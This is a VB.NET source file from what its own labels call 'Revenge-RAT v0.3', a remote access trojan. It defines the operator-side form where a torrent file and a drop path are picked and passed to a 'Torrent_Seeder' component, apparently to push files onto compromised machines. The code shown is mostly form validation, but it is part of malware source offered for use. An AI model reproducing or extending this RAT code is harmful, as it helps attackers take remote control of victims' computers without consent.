Imports Microsoft.VisualBasic.CompilerServices
Imports System.IO
Imports Revenge_RAT_v0._3.RevengeRAT

Public Class Select_Torrent
    Private Sub NextF_Click(sender As Object, e As EventArgs) Handles NextF.Click
        If (Me.TFP.Text = Nothing) Then
            MessageBox.Show("You must select a torrent file!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        ElseIf Not File.Exists(Me.TFP.Text) Then
            MessageBox.Show((Me.TFP.Text & ChrW(13) & ChrW(10) & "Not Exists!"), "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        ElseIf Operators.ConditionalCompareObjectEqual(Me.DP.SelectedItem, Nothing, False) Then
            MessageBox.Show("You must select path to drop files inside it!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        Else
            Dim seeder As New Torrent_Seeder
            seeder.Bytes = File.ReadAllBytes(Me.TFP.Text)
            seeder.FN = Conversions.ToString(SocketServer.Encode(Path.GetFileName(Me.TFP.Text)))
            seeder.SelectedIndex = Me.DP.SelectedIndex
            seeder.Name = "TSF"
            seeder.Show
            Me.Close()
        End If
    End Sub

    Private Sub STF_Click(sender As Object, e As EventArgs) Handles STF.Click
        Dim dialog As New OpenFileDialog
        dialog.Filter = "Torrent File |*.torrent"
        dialog.Title = "Select your torrent file!"
        dialog.ShowDialog()

        If (dialog.FileName <> Nothing) Then
            Me.TFP.Text = dialog.FileName
        End If
    End Sub
End Class